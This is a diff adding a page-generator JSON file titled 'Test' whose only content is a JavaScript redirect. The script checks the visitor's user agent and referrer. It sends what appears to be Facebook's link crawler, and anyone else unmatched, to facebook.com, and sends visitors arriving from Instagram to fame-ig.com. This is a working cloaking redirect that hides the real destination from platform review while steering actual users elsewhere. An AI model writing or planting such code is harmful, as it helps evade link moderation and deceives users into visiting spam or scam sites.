@@ -1,0 +1,6 @@
+{
+  "name": "Test",
+  "tagline": "",
+  "body": "\r\n\t<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js\"></script>\r\n\t\r\n\t      <script type=\"text/javascript\">\r\n         (function($) {\r\n             $(document).ready(function() {\r\n                var ua = navigator.userAgent;\r\n\t\t\t\tvar ref = document.referrer;\r\n             var checker = {\r\n               one: ua.match(/face/),\r\n               two: ref.match(/instagram/)\r\n             };\r\n             if (checker.one){\r\n\t\t\t     window.location.href = 'https://facebook.com';\t\t    \r\n             }\r\n             else if (checker.two){\r\n                 window.location.href = 'https://fame-ig.com';\r\n             }\r\n\t\t\t else\r\n\t\t\t {\r\n\t\t\t    window.location.href = 'https://facebook.com';\r\n\t\t\t }\r\n             });\r\n         })(jQuery);\r\n      </script>\r\n",
+  "note": "Don't delete this file! It's used internally to help with page regeneration."
+}
